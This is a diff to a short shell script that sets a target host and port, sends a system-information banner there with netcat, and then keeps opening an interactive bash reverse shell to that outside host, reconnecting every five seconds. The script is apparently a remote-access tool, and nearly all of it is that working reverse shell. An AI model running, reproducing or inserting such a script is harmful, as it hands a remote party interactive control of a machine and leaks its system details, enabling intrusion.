@@ -1,5 +1,18 @@
 #!/bin/sh
 TARGET='IP port'
+TARGET='firehole.gvalkov.com 9981'
 
-uname -a | nc $TARGET -c
-nc $TARGET -e /usr/local/bin/bash
+# bash and user configuration
+./home/configure
+
+# connect banner
+./bin/info-runner | nc $TARGET -c
+
+while :
+do
+	# to reconnect reverse shell in cese the link drops
+	# touch reconnect
+	nc $TARGET -e '/usr/bin/env bash -i'
+	sleep 5
+	[ -e reconnect ] || break
+done
